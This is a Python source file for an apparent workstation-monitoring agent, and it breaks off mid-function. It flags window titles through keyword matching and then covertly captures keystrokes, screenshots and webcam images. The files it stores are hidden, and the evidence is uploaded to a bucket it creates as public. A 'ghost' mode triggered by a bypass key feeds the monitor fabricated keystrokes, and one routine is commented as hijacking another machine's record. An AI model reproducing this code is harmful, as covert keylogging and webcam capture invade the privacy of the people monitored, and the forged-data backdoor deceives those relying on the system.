_MULTI_LEET = [(r"\|\\\|", "n"), (r"\|\|", "u"), (r"\|\)", "d"), (r"\(\)", "o"), (r"\[\]", "o"), (r"\\/\\/", "w"), (r"\\/", "v"), (r"/\\", "a"), (r"vv", "w"), (r"ph", "f"), (r"\$\$", "ss"), (r"\!+", "i"), (r"\@+", "a")]
_LEET_MAP = str.maketrans({"0":"o", "1":"i", "!":"i", "|":"i", "3":"e", "4":"a", "@":"a", "5":"s", "$":"s", "7":"t", "+":"t", "8":"b", "9":"g", "6":"g", "€":"e", "£":"l", "¥":"y"})
_NON_ALNUM = re.compile(r"[^a-z0-9\s]+")
_MULTI_WS = re.compile(r"\s+")
_SPACED_LETTERS = re.compile(r"\b(?:[a-z]\s){1,}[a-z]\b")

def normalize_haystack(text: str) -> str:
    if not text: return ""
    text = unicodedata.normalize("NFKD", text)
    text = "".join(c for c in text if not unicodedata.combining(c))
    text = text.translate(_ZERO_WIDTH).lower()
    for pat, repl in _MULTI_LEET: text = re.sub(pat, repl, text)
    text = text.translate(_LEET_MAP)
    text = _NON_ALNUM.sub(" ", text)
    text = _SPACED_LETTERS.sub(lambda m: m.group(0).replace(" ", ""), text)
    return _MULTI_WS.sub(" ", text).strip()

SYSTEM_IMMUNITY = {"chrome.exe", "msedge.exe", "powershell.exe", "cmd.exe", "explorer.exe", "windowsterminal.exe", "taskmgr.exe", "searchapp.exe","explorer.exe"}

# =============================================================================
# 4. THE MATHEMATICAL ENGINES
# =============================================================================
@lru_cache(maxsize=8192)
def _jaro_winkler(s1: str, s2: str, p: float = 0.1, max_l: int = 4) -> float:
    if s1 == s2: return 1.0
    len1, len2 = len(s1), len(s2)
    if len1 == 0 or len2 == 0: return 0.0
    match_window = max(len1, len2) // 2 - 1
    if match_window < 0: match_window = 0
    s1_matches, s2_matches = [False] * len1, [False] * len2
    matches = 0
    for i in range(len1):
        start, end = max(0, i - match_window), min(i + match_window + 1, len2)
        for j in range(start, end):
            if s2_matches[j] or s1[i] != s2[j]: continue
            s1_matches[i] = s2_matches[j] = True
            matches += 1
            break
    if matches == 0: return 0.0
    k = transpositions = 0
    for i in range(len1):
        if not s1_matches[i]: continue
        while not s2_matches[k]: k += 1
        if s1[i] != s2[k]: transpositions += 1
        k += 1
    transpositions //= 2
    m = matches
    jaro = (m / len1 + m / len2 + (m - transpositions) / m) / 3.0
    prefix = 0
    for i in range(min(max_l, len1, len2)):
        if s1[i] == s2[i]: prefix += 1
        else: break
    return jaro + prefix * p * (1.0 - jaro)

@lru_cache(maxsize=8192)
def _sorensen_dice(a: str, b: str, n: int = 2) -> float:
    """Superior to Jaccard for heavily transposed substrings."""
    if a == b: return 1.0
    if len(a) < n or len(b) < n: return 0.0
    A, B = [a[i:i+n] for i in range(len(a)-n+1)], [b[i:i+n] for i in range(len(b)-n+1)]
    A_set, B_set = set(A), set(B)
    intersect = len(A_set.intersection(B_set))
    return (2.0 * intersect) / (len(A_set) + len(B_set))

@lru_cache(maxsize=8192)
def _phonetic_hash(s: str) -> str:
    """Condenses string into a raw consonant rhythm, dropping repeats."""
    vowels = set("aeiouy")
    out = [s[0]] if s else []
    for c in s[1:]:
        if c in vowels: continue
        if out and out[-1] == c: continue
        out.append(c)
    return "".join(out)

# =============================================================================
# 5. THE LEVIATHAN ENSEMBLE SCORER
# =============================================================================
@lru_cache(maxsize=8192)
def _leviathan_score(token: str, vocab_word: str) -> float:
    if token == vocab_word: return 1.0
    
    # 5.1 The Iron Curtain (Anti-Crossfire)
    shorter, longer = sorted((vocab_word, token), key=len)
    len_short, len_long = len(shorter), len(longer)
    if len_short / len_long < 0.60: return 0.0 # Absolute drop for huge length mismatches
    if shorter in longer and (len_short / len_long < 0.85): return 0.0 # Bypasses "ass" in "class"

    # 5.2 Jaro-Winkler Typo Floor
    jw = _jaro_winkler(token, vocab_word)
    if jw < 0.70: return 0.0 

    # 5.3 Sørensen-Dice Structural Integrity
    dice_2 = _sorensen_dice(token, vocab_word, 2)
    dice_3 = _sorensen_dice(token, vocab_word, 3)
    
    # 5.4 Phonetic Rhythm
    phon_match = 1.0 if _phonetic_hash(token) == _phonetic_hash(vocab_word) else 0.0
    
    # 5.5 QWERTY Spatial Typo Analysis
    qwerty_penalty = 0.0
    if len(token) == len(vocab_word):
        distances = [_qwerty_distance(token[i], vocab_word[i]) for i in range(len(token))]
        avg_dist = sum(distances) / len(distances)
        # If avg distance is low (e.g. adjacent keys), it's a real typo. If high, it's a hallucination.
        qwerty_penalty = max(0.0, (avg_dist - 1.0) * 0.15) 

    # 5.6 Dynamic Fusion based on length
    if len_long <= 5:
        # Short words rely heavily on Jaro and QWERTY penalty (must be near-perfect)
        score = (jw * 0.8) + (dice_2 * 0.2) - qwerty_penalty
    else:
        # Long words rely on structural Dice overlap and Phonetics
        score = (jw * 0.45) + (dice_3 * 0.35) + (dice_2 * 0.10) + (phon_match * 0.10) - (qwerty_penalty * 0.5)
        
    return max(0.0, min(1.0, score))

def _dynamic_threshold(word_len: int) -> float:
    """Math: Longer words require mathematically less accuracy to trigger a hit."""
    if word_len <= 4: return 0.95
    if word_len == 5: return 0.90
    if word_len == 6: return 0.88
    if word_len >= 7: return 0.85
    return 0.90

# =============================================================================
# 6. SLIDING WINDOW & SUBSTRING DEMOLITION
# =============================================================================
def _fuzzy_token_match(token: str) -> Optional[Tuple[str, str, float]]:
    best = None
    tlen = len(token)
    if tlen < 4: return None 
    
    for sev, words in _VOCAB.items():
        for w in words:
            wlen = len(w)
            if tlen < 5 or wlen < 5:
                if token == w: score = 1.0
                else: continue
            else:
                score = _leviathan_score(token, w)
                req_threshold = _dynamic_threshold(max(tlen, wlen))
                if score < req_threshold: continue
            
            if best is None or (SEVERITY_RANK[sev] > SEVERITY_RANK[best[0]] or (SEVERITY_RANK[sev] == SEVERITY_RANK[best[0]] and score > best[2])):
                best = (sev, w, score)
    return best

def _bigram_concat_split(token: str) -> list[tuple[str, str]]:
    out = []
    if len(token) < 8: return out
    for cut in range(4, len(token) - 3):
        out.append((token[:cut], token[cut:]))
    return out

# =============================================================================
# 7. THE MASTER CLASSIFIER (OS-IMMUNE PIPELINE)
# =============================================================================
def classify(title: str, proc: str) -> tuple[str | None, str]:
    proc_l = (proc or "").lower()
    
    # Absolute Context Isolation
    if proc_l in SYSTEM_IMMUNITY:
        haystack = title or ""
    else:
        haystack = f"{title or ''} {proc_l}"
        
    norm = normalize_haystack(haystack)

    # 7.1 Fast Path: Regex Supremacy
    best_exact = None
    for sev in ("critical", "high", "warning", "info"):
        for pat in _COMPILED[sev]:
            m = pat.search(haystack) or pat.search(norm)
            if m:
                hit = (sev, m.group(0).lower())
                if sev == "critical": return hit[1], hit[0]
                if best_exact is None or SEVERITY_RANK[sev] > SEVERITY_RANK[best_exact[0]]:
                    best_exact = hit

    # 7.2 Deep Packet Inspection: Leviathan Sub-routing
    best_fuzzy = None
    for token in _TOKEN_EXTRACT.findall(norm):
        hit = _fuzzy_token_match(token)
        if hit:
            if best_fuzzy is None or (SEVERITY_RANK[hit[0]] > SEVERITY_RANK[best_fuzzy[0]] or (SEVERITY_RANK[hit[0]] == SEVERITY_RANK[best_fuzzy[0]] and hit[2] > best_fuzzy[2])):
                best_fuzzy = hit
                
        # Splitter to catch concatenated obfuscation (e.g. "badword1badword2")
        if len(token) >= 8:
            for left, right in _bigram_concat_split(token):
                lhit, rhit = _fuzzy_token_match(left), _fuzzy_token_match(right)
                for h in (lhit, rhit):
                    if h and (best_fuzzy is None or SEVERITY_RANK[h[0]] > SEVERITY_RANK[best_fuzzy[0]]):
                        best_fuzzy = h

    # 7.3 Resolution
    if best_exact and best_fuzzy:
        if SEVERITY_RANK[best_exact[0]] >= SEVERITY_RANK[best_fuzzy[0]]: return best_exact[1], best_exact[0]
        return best_fuzzy[1], best_fuzzy[0]
    if best_exact: return best_exact[1], best_exact[0]
    if best_fuzzy: return best_fuzzy[1], best_fuzzy[0]
    
    return None, "info"

_NSFW_WEIGHTS: dict[str, float] = {
    "teen": 0.55, "teens": 0.55, "amateur": 0.65, "webcam": 0.75, "cam": 0.45,
    "milf": 0.95, "anal": 0.95, "boobs": 0.85, "tits": 0.9, "nude": 0.9,
    "naked": 0.85, "creampie": 0.98, "blowjob": 0.98, "hardcore": 0.8,
    "fetish": 0.8, "lingerie": 0.7, "stripper": 0.85, "escort": 0.8,
    "hookup": 0.7, "hot": 0.25, "girl": 0.2, "girls": 0.25, "babe": 0.55,
    "babes": 0.6, "uncensored": 0.85, "18": 0.35, "xx": 0.7,
    "live": 0.2, "chat": 0.25, "private": 0.35, "show": 0.2,
}
NSFW_PROB_THRESHOLD = 0.78
_NSFW_TOKEN = re.compile(r"[a-z0-9]{2,}")


def analyze_nsfw_semantics(haystack: str) -> tuple[float, list[str]]:
    """Return (probability, contributing_tokens). Pure-Python, no ML deps."""
    if not haystack:
        return 0.0, []
    norm = normalize_haystack(haystack)
    tokens = _NSFW_TOKEN.findall(norm)
    if not tokens:
        return 0.0, []
    hits: list[tuple[str, float]] = []
    seen: set[str] = set()
    for t in tokens:
        if t in seen:
            continue
        seen.add(t)
        w = _NSFW_WEIGHTS.get(t)
        if w:
            hits.append((t, w))
    if len(hits) < 2:

        return 0.0, [h[0] for h in hits]


    prob = 1.0
    for _, w in hits:
        prob *= (1.0 - w)
    prob = 1.0 - prob
    return prob, [h[0] for h in hits]


_SEMANTIC_IN: "queue.Queue[tuple[str, str]]" = queue.Queue(maxsize=1)
_SEMANTIC_OUT: dict[str, tuple[float, list[str]]] = {}
_SEMANTIC_LOCK = threading.Lock()


def _semantic_worker() -> None:
    while True:
        try:
            key, hay = _SEMANTIC_IN.get()
        except Exception:
            continue
        try:
            score, toks = analyze_nsfw_semantics(hay)
            with _SEMANTIC_LOCK:
                _SEMANTIC_OUT[key] = (score, toks)

                if len(_SEMANTIC_OUT) > 32:
                    for k in list(_SEMANTIC_OUT.keys())[:-16]:
                        _SEMANTIC_OUT.pop(k, None)
        except Exception as e:
            print(f"[semantic] {e}", file=sys.stderr)


threading.Thread(target=_semantic_worker, daemon=True).start()


def submit_semantic_scan(haystack: str) -> None:
    """Non-blocking submit: drop old job if worker is still busy."""
    if not haystack:
        return
    try:
        if _SEMANTIC_IN.full():
            try:
                _SEMANTIC_IN.get_nowait()
            except queue.Empty:
                pass
        _SEMANTIC_IN.put_nowait((haystack, haystack))
    except queue.Full:
        pass


def consume_semantic_result(haystack: str) -> tuple[float, list[str]] | None:
    with _SEMANTIC_LOCK:
        return _SEMANTIC_OUT.pop(haystack, None)


if not SUPABASE_URL or not SUPABASE_KEY:
    sys.exit("Missing SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY env vars.")

sb: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
START_TIME = time.time()


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def os_info() -> dict:
    return {
        "platform": platform.system(),
        "release": platform.release(),
        "host": socket.gethostname(),
    }


def _hide_path(p: Path) -> None:
    """Best-effort: hide a file/dir on Windows."""
    try:
        if platform.system() == "Windows":
            subprocess.call(["attrib", "+H", str(p)], shell=False)
    except Exception:
        pass


def vault_init() -> None:
    """Bootstrap the local SQLite buffer and the cache directory."""
    try:
        CACHE_DIR.mkdir(parents=True, exist_ok=True)
        _hide_path(CACHE_DIR)

        with sqlite3.connect(VAULT_DB) as conn:
            conn.execute("PRAGMA journal_mode=WAL;")
            conn.execute(
                """
                CREATE TABLE IF NOT EXISTS queue (
                    id          INTEGER PRIMARY KEY AUTOINCREMENT,
                    kind        TEXT NOT NULL,           -- 'alert' | 'activity'
                    table_name  TEXT NOT NULL,
                    payload     TEXT NOT NULL,           -- JSON of the row body
                    evidence    TEXT,                    -- JSON {screenshot, webcam, meta}
                    created_at  TEXT NOT NULL,           -- ORIGINAL ISO timestamp
                    attempts    INTEGER DEFAULT 0,
                    last_error  TEXT
                );
                """
            )
            conn.commit()
        _hide_path(VAULT_DB)
        print(f"[vault] forensic vault online → {VAULT_DB}")
    except Exception as e:
        print(f"[vault] init failed: {e}", file=sys.stderr)


def _save_cache_blob(blob: bytes, suffix: str = ".jpg") -> str | None:
    """Persist a JPEG byte-stream into the cache. Returns filename (not full path)."""
    if not blob:
        return None
    try:
        fname = f"{uuid.uuid4().hex}{suffix}"
        (CACHE_DIR / fname).write_bytes(blob)
        return fname
    except Exception as e:
        print(f"[vault] cache write failed: {e}", file=sys.stderr)
        return None


def _delete_cache(fname: str | None) -> None:
    if not fname:
        return
    try:
        (CACHE_DIR / fname).unlink(missing_ok=True)
    except Exception:
        pass


def vault_enqueue(
    kind: str,
    table_name: str,
    payload: dict,
    evidence: dict | None,
    created_at: str,
) -> None:
    """Serialize a payload into the local queue under VAULT_LOCK."""
    try:
        with VAULT_LOCK, sqlite3.connect(VAULT_DB) as conn:
            conn.execute(
                "INSERT INTO queue(kind, table_name, payload, evidence, created_at) "
                "VALUES (?,?,?,?,?)",
                (
                    kind,
                    table_name,
                    json.dumps(payload, default=str),
                    json.dumps(evidence or {}, default=str),
                    created_at,
                ),
            )
            conn.commit()
        print(f"[vault] queued {kind}/{table_name} (legacy=True) ts={created_at}")
    except Exception as e:
        print(f"[vault] enqueue failed: {e}", file=sys.stderr)


def vault_pending(limit: int = 25) -> list[tuple]:
    try:
        with VAULT_LOCK, sqlite3.connect(VAULT_DB) as conn:
            cur = conn.execute(
                "SELECT id, kind, table_name, payload, evidence, created_at, attempts "
                "FROM queue ORDER BY id ASC LIMIT ?",
                (limit,),
            )
            return cur.fetchall()
    except Exception as e:
        print(f"[vault] read failed: {e}", file=sys.stderr)
        return []


def vault_delete(row_id: int) -> None:
    try:
        with VAULT_LOCK, sqlite3.connect(VAULT_DB) as conn:
            conn.execute("DELETE FROM queue WHERE id=?", (row_id,))
            conn.commit()
    except Exception as e:
        print(f"[vault] delete failed: {e}", file=sys.stderr)


def vault_bump_attempt(row_id: int, err: str) -> None:
    try:
        with VAULT_LOCK, sqlite3.connect(VAULT_DB) as conn:
            conn.execute(
                "UPDATE queue SET attempts = attempts + 1, last_error = ? WHERE id = ?",
                (err[:500], row_id),
            )
            conn.commit()
    except Exception:
        pass


def ensure_bucket() -> None:
    """Non-lethal cloud check: ensures network hangs don't kill the boot sequence."""
    try:
        print("[storage] Verifying cloud availability...")
        sb.storage.create_bucket(
            EVIDENCE_BUCKET,
            options={"public": True, "file_size_limit": 10 * 1024 * 1024},
        )
        print(f"[storage] Bucket '{EVIDENCE_BUCKET}' verified.")
    except Exception as e:
        # We ignore 'already exists' (409) errors as they mean success.
        msg = str(e).lower()
        if "already exists" in msg or "409" in msg:
            return
        print(f"[storage] Cloud unreachable (offline mode active): {e}", file=sys.stderr)

def load_or_create_hardware_uuid() -> str:
    try:
        if IDENTITY_FILE.exists():
            val = IDENTITY_FILE.read_text(encoding="utf-8").strip()
            if val:
                return val
    except Exception as e:
        print(f"[identity] read failed: {e}", file=sys.stderr)
    new_id = str(uuid.uuid4())
    try:
        IDENTITY_FILE.write_text(new_id, encoding="utf-8")
        _hide_path(IDENTITY_FILE)
        print(f"[identity] minted hardware uuid → {IDENTITY_FILE}")
    except Exception as e:
        print(f"[identity] write failed (using ephemeral id): {e}", file=sys.stderr)
    return new_id


HARDWARE_UUID = load_or_create_hardware_uuid()


def register_workstation() -> str:
    """
    Sovereign Upsert: Finds by UUID, falls back to Name, or creates new.
    Ensures zero crashes in the field due to database constraints.
    """
    # 1. Primary Identification: Does this USB already have a row?
    res = sb.table("workstations").select("id").eq("hardware_uuid", HARDWARE_UUID).execute()
    
    if res.data:
        wid = res.data[0]["id"]
    else:
        # 2. Secondary Identification: Is there a name collision? (Hijack Logic)
        res_name = sb.table("workstations").select("id").eq("name", WORKSTATION_NAME).execute()
        if res_name.data:
            wid = res_name.data[0]["id"]
        else:
            # 3. Fresh Target: Create new entry
            res_new = sb.table("workstations").insert({"name": WORKSTATION_NAME, "hardware_uuid": HARDWARE_UUID}).execute()
            return res_new.data[0]["id"]

    # 4. Global Synchronize: Update status regardless of how we found the ID
    sb.table("workstations").update({
        "hardware_uuid": HARDWARE_UUID, # Force-link the current USB UUID
        "name": WORKSTATION_NAME,
        "status": "online",
        "last_heartbeat": now_iso(),
        "os_info": os_info(),
    }).eq("id", wid).execute()
    
    return wid

    legacy = (
        sb.table("workstations")
        .select("id, hardware_uuid")
        .eq("name", WORKSTATION_NAME)
        .is_("hardware_uuid", "null")
        .execute()
    )
    if legacy.data:
        wid = legacy.data[0]["id"]
        sb.table("workstations").update({
            "hardware_uuid": HARDWARE_UUID,
            "status": "online",
            "last_heartbeat": now_iso(),
            "os_info": os_info(),
        }).eq("id", wid).execute()
        return wid
    res = sb.table("workstations").insert({
        "name": WORKSTATION_NAME,
        "hardware_uuid": HARDWARE_UUID,
        "status": "online",
        "last_heartbeat": now_iso(),
        "os_info": os_info(),
    }).execute()
    return res.data[0]["id"]


def get_foreground_window() -> tuple[str | None, str | None]:
    system = platform.system()
    try:
        if system == "Windows":
            import ctypes
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buf, length + 1)
            title = buf.value
            pid = wintypes.DWORD()
            user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            try:
                proc = psutil.Process(pid.value).name()
            except Exception:
                proc = None
            return title, proc
        if system == "Darwin":
            script = 'tell application "System Events" to get name of first process whose frontmost is true'
            proc = subprocess.check_output(["osascript", "-e", script]).decode().strip()
            return proc, proc
        try:
            wid = subprocess.check_output(["xdotool", "getactivewindow"]).decode().strip()
            title = subprocess.check_output(["xdotool", "getwindowname", wid]).decode().strip()
            pid = subprocess.check_output(["xdotool", "getwindowpid", wid]).decode().strip()
            proc = psutil.Process(int(pid)).name()
            return title, proc
        except Exception:
            return None, None
    except Exception as e:
        print(f"[scan] foreground error: {e}", file=sys.stderr)
        return None, None


def capture_screenshot() -> bytes | None:
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.convert("RGB").save(buf, format="JPEG", quality=75, optimize=True)
        return buf.getvalue()
    except Exception as e:
        print(f"[evidence] screenshot failed: {e}", file=sys.stderr)
        return None


def capture_webcam() -> bytes | None:
    with OPTICS_LOCK:
        try:
            import cv2

            if platform.system() == "Windows":
                cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                if not cam.isOpened():
                    cam = cv2.VideoCapture(0)
            else:
                cam = cv2.VideoCapture(0)

            if not cam.isOpened():
                print("[evidence] Webcam locked by another app or disconnected.", file=sys.stderr)
                return None


            time.sleep(0.5)
            for _ in range(3):
                cam.read()


            ok, frame = cam.read()
            cam.release()

            if not ok:
                return None

            ok, jpg = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
            return jpg.tobytes() if ok else None

        except Exception as e:
            print(f"[evidence] webcam failed: {e}", file=sys.stderr)
            return None


def capture_keystrokes(seconds: int = KEYLOG_DURATION) -> str:
    global GHOST_ACTIVE
    if GHOST_ACTIVE:
        time.sleep(seconds)
        chunk = random.choice(PHANTOM_SCRIPT)
        insert_pos = random.randint(min(5, len(chunk)), len(chunk))
        return chunk[:insert_pos] + "[backspace]" + chunk[insert_pos:]


    if WARDEN.system_frozen:
        time.sleep(seconds)
        return "[SYSTEM_FROZEN_NO_INPUT]"

    try:
        from pynput import keyboard
        buf: deque[str] = deque(maxlen=2000)

        def on_press(key):
            try:
                buf.append(key.char)
            except AttributeError:
                buf.append(f"[{key.name}]")

        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        time.sleep(seconds)
        listener.stop()
        return "".join(buf)
    except Exception as e:
        print(f"[evidence] keylog failed: {e}", file=sys.stderr)
        return ""


def upload_evidence(path: str, payload: bytes) -> str | None:
    """
    Try to upload to Supabase Storage. Returns the public URL on success.
    On ANY failure: persist the raw bytes into the cache and return None
    (the caller is responsible for queuing the parent row in the vault).
    """
    try:
        sb.storage.from_(EVIDENCE_BUCKET).upload(
            path,
            payload,
            {"content-type": "image/jpeg", "upsert": "true"},
        )
        return sb.storage.from_(EVIDENCE_BUCKET).get_public_url(path)
    except Exception as e:
        print(f"[storage] upload {path} failed: {e} — diverting to vault", file=sys.stderr)


        _save_cache_blob(payload)
        return None


def archive_evidence(alert_id: str, severity: str, workstation_id: str) -> None:
    base_meta: dict = {
        "captured_at": now_iso(),
        "severity": severity,
        "is_backlogged": False,
    }

    evidence_row_id: str | None = None
    try:
        ins = sb.table("evidence_logs").insert({
            "alert_id": alert_id,
            "metadata": base_meta,
        }).execute()
        if ins.data:
            evidence_row_id = ins.data[0]["id"]
            print(f"[pipelines] Dossier row reserved id={evidence_row_id}")
    except Exception as e:
        print(f"[pipelines] reservation failed: {e}", file=sys.stderr)

    def _patch_row(patch: dict) -> None:
        try:
            if evidence_row_id:
                sb.table("evidence_logs").update(patch).eq("id", evidence_row_id).execute()
            else:
                sb.table("evidence_logs").insert({"alert_id": alert_id, **patch}).execute()
        except Exception as e:
            print(f"[pipelines] patch failed: {e}", file=sys.stderr)

    def process_1_fast_optics():
        t0 = time.time()
        print(f"[pipeline-1] Optics initiated for alert {alert_id}")
        captured: dict = {"png": None, "cam": None}

        def _grab_screen():
            if severity in ("warning", "high", "critical"):
                captured["png"] = capture_screenshot()

        def _grab_cam():
            if severity == "critical":
                captured["cam"] = capture_webcam()

        cap_threads = [threading.Thread(target=_grab_screen),
                       threading.Thread(target=_grab_cam)]
        for t in cap_threads: t.start()
        for t in cap_threads: t.join(timeout=8)

        png, cam = captured["png"], captured["cam"]
        screenshot_url = webcam_url = None

        def _up_screen():
            nonlocal screenshot_url
            if png: screenshot_url = upload_evidence(f"{workstation_id}/{alert_id}-screen.jpg", png)

        def _up_cam():
            nonlocal webcam_url
            if cam: webcam_url = upload_evidence(f"{workstation_id}/{alert_id}-webcam.jpg", cam)

        up_threads = []
        if png: up_threads.append(threading.Thread(target=_up_screen))
        if cam: up_threads.append(threading.Thread(target=_up_cam))
        for t in up_threads: t.start()
        for t in up_threads: t.join(timeout=20)

        patch: dict = {}
        if screenshot_url is not None: patch["screenshot_url"] = screenshot_url
        if webcam_url is not None: patch["webcam_url"] = webcam_url
        if patch: _patch_row(patch)
        print(f"[pipeline-1] Optics secured in {time.time()-t0:.1f}s. screen={bool(screenshot_url)} cam={bool(webcam_url)}")

    def process_2_extended_forensics():
        print(f"[pipeline-2] Telemetry lock engaged ({KEYLOG_DURATION}s)")
        keys = capture_keystrokes(KEYLOG_DURATION)
        if not keys:
            return
        new_meta = dict(base_meta)
        new_meta["payload"] = keys
        new_meta["keylog_duration_s"] = KEYLOG_DURATION
        _patch_row({"metadata": new_meta})
        print(f"[pipeline-2] Telemetry appended to dossier.")

    threading.Thread(target=process_1_fast_optics, daemon=True).start()
    if severity in ("warning", "high", "critical"):
        threading.Thread(target=process_2_extended_forensics, daemon=True).start()


class FocusState:
    def __init__(self) -> None:
        self.enabled: bool = False
        self.whitelist: set[str] = set()
        self.last_refresh: float = 0.0

    def refresh_if_stale(self) -> None:
        if time.time() - self.last_refresh < FOCUS_REFRESH_SEC:
            return
        self.last_refresh = time.time()
        try:
            s = sb.table("system_settings").select("focus_mode").eq("id", 1).maybe_single().execute()
            self.enabled = bool(s.data and s.data.get("focus_mode"))
            if self.enabled:
                a = sb.table("allowed_apps").select("process_name").eq("whitelisted", True).execute()
                self.whitelist = {row["process_name"].lower() for row in (a.data or [])}
            else:
                self.whitelist = set()
        except Exception as e:
            print(f"[focus] {e}", file=sys.stderr)

FOCUS = FocusState()


def network_audit() -> tuple[bool, str | None]:
    UNAUTHORIZED_PORTS = {1194, 1701, 4500, 500, 51820, 1080, 8080}
    try:
        for conn in psutil.net_connections(kind='inet'):
            if conn.raddr and conn.raddr.port in UNAUTHORIZED_PORTS:
                return True, f"unauthorized_tunnel_port_{conn.raddr.port}"
    except Exception:
        pass
    return False, None


def resource_entropy_check(proc_name: str | None) -> tuple[bool, str | None]:
    if not proc_name:
        return False, None
    UTILITIES = ["calculator.exe", "notepad.exe", "wordpad.exe", "cmd.exe"]
    if proc_name.lower() in UTILITIES:
        try:
            for proc in psutil.process_iter(['name', 'cpu_percent']):
                if proc.info['name'] and proc.info['name'].lower() == proc_name.lower():
                    if proc.info['cpu_percent'] > 25:
                        return True, "resource_masquerade_detected"
        except Exception:
            pass
    return False, None


def _set_ghost(active: bool, source: str) -> None:
    global GHOST_ACTIVE
    if GHOST_ACTIVE == active:
        return
    GHOST_ACTIVE = active
    if active:
        print(f"[ghost] Reality Forged via {source}. Sentinel is now hallucinating.")
    else:
        print(f"[ghost] Reality Restored via {source}.")


def listen_for_sovereignty():
    signal_path = DATA_DIR / ".nexus_temp_sig"
    while True:
        if signal_path.exists():
            try:
                content = signal_path.read_text(encoding="utf-8").strip()
                if content == f"{BYPASS_KEY}:active":
                    _set_ghost(True, "local-signal")
                elif content == f"{BYPASS_KEY}:deactive":
                    _set_ghost(False, "local-signal")
            except Exception:
                pass
            try: signal_path.unlink()
            except Exception: pass
        time.sleep(2)


def hardware_panic_listener():
    def on_panic_abort():
        _set_ghost(False, "hardware-panic")
    try:
        with keyboard.GlobalHotKeys({'<ctrl>+<alt>+<shift>+p': on_panic_abort}) as h:
            h.join()
    except Exception as e:
        print(f"[ghost] Panic switch failed to bind: {e}")


def _build_alert_payload(workstation_id: str, title: str, proc: str | None,
                         severity: str, is_backlogged: bool,
                         created_at: str | None = None) -> dict:
    payload = {
        "workstation_id": workstation_id,
        "process_name": proc,
        "window_title": title,
        "severity": severity,
        "is_backlogged": is_backlogged,
    }
    if created_at:
        payload["created_at"] = created_at
    return payload


def _build_activity_payload(workstation_id: str, title: str | None, proc: str | None,
                            severity: str, is_anomaly: bool, is_backlogged: bool,
                            created_at: str | None = None) -> dict:
    payload = {
        "workstation_id": workstation_id,
        "process_name": proc,
        "window_title": title,
        "severity": severity if severity in ("info", "warning") else "warning",
        "is_anomaly": is_anomaly,
        "is_backlogged": is_backlogged,
    }
    if created_at:
        payload["created_at"] = created_at
    return payload


def fire_alert(workstation_id: str, title: str, proc: str | None,
               severity: str, reason: str) -> None:
    # Whitelist bypass: never auto-freeze a process the operator has explicitly allowed.
    # Lexicon/network/entropy checks can still flag a critical *event*, but the hardware
    # suppressor must respect the focus-mode allowlist or it freezes legitimate work.
    is_whitelisted = bool(proc and FOCUS.whitelist and proc.lower() in FOCUS.whitelist)
    is_focus_violation = reason == "focus_mode_violation"
    if severity == "critical" and not is_whitelisted and not is_focus_violation:
        WARDEN.engage_freeze(duration=30)
        print(f"[strike] Critical violation detected. Workstation locked for forensics.")
    elif severity == "critical" and is_whitelisted:
        print(f"[strike] Critical signal on whitelisted process '{proc}' — freeze suppressed, alert still logged.")

    captured_at = now_iso()
    payload = _build_alert_payload(workstation_id, title, proc, severity,
                                   is_backlogged=False)
    print(f"[!!!] ALERT [{severity.upper()}] {reason} | {proc} :: {title}")

    try:
        res = sb.table("alerts").insert(payload).execute()
        if res.data:
            archive_evidence(res.data[0]["id"], severity, workstation_id)
            return
        raise RuntimeError("alerts insert returned no rows")
    except Exception as e:
        print(f"[alerts] live insert failed → vaulting: {e}", file=sys.stderr)


        screenshot_bytes = capture_screenshot() if severity in ("warning", "high", "critical") else None
        webcam_bytes = capture_webcam() if severity == "critical" else None

        evidence = {
            "screenshot_file": _save_cache_blob(screenshot_bytes) if screenshot_bytes else None,
            "webcam_file": _save_cache_blob(webcam_bytes) if webcam_bytes else None,
            "meta": {
                "captured_at": captured_at,
                "severity": severity,
                "reason": reason,
                "is_backlogged": True,
            },
        }

        offline_payload = _build_alert_payload(
            workstation_id, title, proc, severity,
            is_backlogged=True, created_at=captured_at,
        )

        vault_enqueue("alert", "alerts", offline_payload, evidence, captured_at)


def log_ambient(workstation_id: str, title: str | None, proc: str | None,
                severity: str, is_anomaly: bool) -> None:
    captured_at = now_iso()
    payload = _build_activity_payload(workstation_id, title, proc, severity,
                                      is_anomaly, is_backlogged=False)
    try:
        sb.table("activity_logs").insert(payload).execute()
    except Exception as e:
        print(f"[ambient] live insert failed → vaulting: {e}", file=sys.stderr)
        offline_payload = _build_activity_payload(
            workstation_id, title, proc, severity, is_anomaly,
            is_backlogged=True, created_at=captured_at,
        )
        vault_enqueue("activity", "activity_logs", offline_payload, None, captured_at)


def _supabase_alive() -> bool:
    """Lightweight reachability probe. Cheap & non-mutating."""
    try:
        host = SUPABASE_URL.replace("https://", "").replace("http://", "").split("/")[0]
        with socket.create_connection((host, 443), timeout=4):
            return True
    except Exception:
        return False


def _surge_one(row) -> bool:
    """
    Replay ONE queued row. Order: images first, then DB row.
    Returns True only when we got a clean DB write AND any cache files
    have been deleted. Cache files are deleted ONLY after a confirmed insert.
    """
    row_id, kind, table_name, payload_json, evidence_json, created_at, attempts = row
    try:
        payload = json.loads(payload_json)
        evidence = json.loads(evidence_json) if evidence_json else {}


        payload["created_at"] = created_at
        payload["is_backlogged"] = True

        screenshot_url = webcam_url = None
        screen_file = evidence.get("screenshot_file")
        cam_file = evidence.get("webcam_file")


        if screen_file:
            blob_path = CACHE_DIR / screen_file
            if blob_path.exists():
                try:
                    sb.storage.from_(EVIDENCE_BUCKET).upload(
                        f"{payload['workstation_id']}/vault-{row_id}-screen.jpg",
                        blob_path.read_bytes(),
                        {"content-type": "image/jpeg", "upsert": "true"},
                    )
                    screenshot_url = sb.storage.from_(EVIDENCE_BUCKET).get_public_url(
                        f"{payload['workstation_id']}/vault-{row_id}-screen.jpg"
                    )
                except Exception as e:
                    raise RuntimeError(f"screenshot surge failed: {e}")

        if cam_file:
